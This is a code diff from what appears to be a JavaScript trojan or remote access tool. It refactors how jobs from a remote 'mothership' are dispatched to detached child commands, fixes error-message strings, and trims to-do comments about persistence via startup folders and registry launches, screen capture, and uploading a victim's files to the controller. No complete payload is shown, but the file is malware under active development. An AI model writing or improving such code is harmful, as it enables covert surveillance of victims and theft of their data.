@@ -32,8 +32,6 @@ debugger;
 
 // ! need to filter out task, startup folder, reg startup launches --> we don't want the task launches to
 //   execute penetrate
-// ! implement get screen capture + upload to mothership
-// ! implement upload files (scan machine, upload selected files to mothership)
 
 // ! motership selection process
 
@@ -819,11 +817,9 @@ class CmdConfig {
         return ret;
     }
 
+    // ! overriden when new child cmd is created by cmdlist
+    //   default impelmentation: watchdog uses this function to relay messages between ping and cmdlist
     // message handler -- used by parent cmds to process incoming messages from child cmds
-    // should be overriden
-    // parent cmd will have a pointer for each child cmd, each child cmd...
-    // (e.g., watchdog relays messages from ping to cmdlist)
-    // ... relay messages between ping and cmdlist
     processMessage(msg) {
         logmsg("starting -- watchdog implementation");
 
@@ -876,7 +872,7 @@ class CmdConfig {
     async launch(cmdlineargs, exitparent) {
         if (!exitparent) exitparent = false;
 
-        logmsg(`launching [${this.cmdname}] ${systemstate.trojanfpath}`);
+        logmsg(`launching [${this.cmdname}]`);
 
         let child = null;
 
@@ -2921,8 +2917,7 @@ async function retrieveClientJob() {
     return clientjob;
 }
 
-// TODO move configfpath to clientjob object
-function cmdlist_handlecmdjob(clientjob, configfpath) {
+function cmdlist_handlecmdjob(clientjob) {
     logmsg("starting");
 
     let cmdlistcmd = systemstate.cmdconfig;
@@ -2930,7 +2925,7 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
     let cmdname = clientjob.cmdname.toLowerCase();
 
     if (!CmdConfig.isCmdExist(cmdname)) {
-        throw new Error(`command is not supported {cmdname}`);
+        throw new Error(`command is not supported ${cmdname}`);
     }
 
     let cmdargs = clientjob.args ?? [];
@@ -2944,11 +2939,12 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
         stopcmd = true;
     }
 
+
     if (stopcmd) {
         let jobcmd = cmdlistcmd.getChildCmd(cmdname);
 
         if (!jobcmd) {
-            throw new Error(`child cmd {cmdname} no in child cmd list`);
+            throw new Error(`child cmd ${cmdname} not in child cmd list`);
         }
 
         jobcmd.processMessage = (msg) => {
@@ -2956,18 +2952,18 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
         };
 
         cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
-    } else if (!stopcmd) {
+    } else {
         let jobcmd = cmdlistcmd.newCmdConfig(cmdname);
 
-        if (!jobcmd) {
-            throw new Error(`could not create child cmd {cmdname}`);
+        if ( ! jobcmd ) {
+            throw new Error(`could not create child cmd ${cmdname}`);
         }
 
         jobcmd.processMessage = (msg) => {
             logmsg(JSON.stringify(msg));
         };
 
-        let ret = jobcmd.launch([configfpath]);
+        let ret = jobcmd.launch( [ clientjob['configfpath'] ] );
 
         jobcmd.childprocess.unref();
     }
@@ -3005,18 +3001,20 @@ async function cmdlist_handleMessage(msg) {
 
     fs.writeFileSync(configfpath, JSON.stringify(clientjob));
 
+    clientjob['configfpath'] = configfpath;
+    
     if (!fileExists(configfpath)) {
-        throw new Error("clientjobconfigpath does note exist " + configfpath);
+        throw new Error(`clientjobconfigpath does note exist ${configfpath}`);
     }
 
     if (jobtype.toLowerCase() == "EXEC_CMD".toLowerCase()) {
-        await cmdlist_handlecmdjob(clientjob, configfpath);
+        cmdlist_handlecmdjob(clientjob);
         return;
     }
 
     // TODO: validate clientjob object before launching command
 
-    let execjobcmd = cmdlistcmd.newCmdConfig("execjob");
+    let execjobcmd = cmdlistcmd.newCmdConfig("execjob"); // anchor
 
     if (!execjobcmd) {
         throw new Error("could not create child cmd execjob");
@@ -4075,7 +4073,6 @@ function exec_getscreencapture() {
     });
 }
 
-// anchor
 async function getscreencapture() {
 
     logmsg("starting");
@@ -4159,7 +4156,6 @@ function errorToJson(error) {
     return errorString;
 }
 
-// TODO invoke logEventMothership 'job_started', 'job_finished', 'job_finished_with_error'
 async function getsystemoverview() {
     logmsg("starting");
    
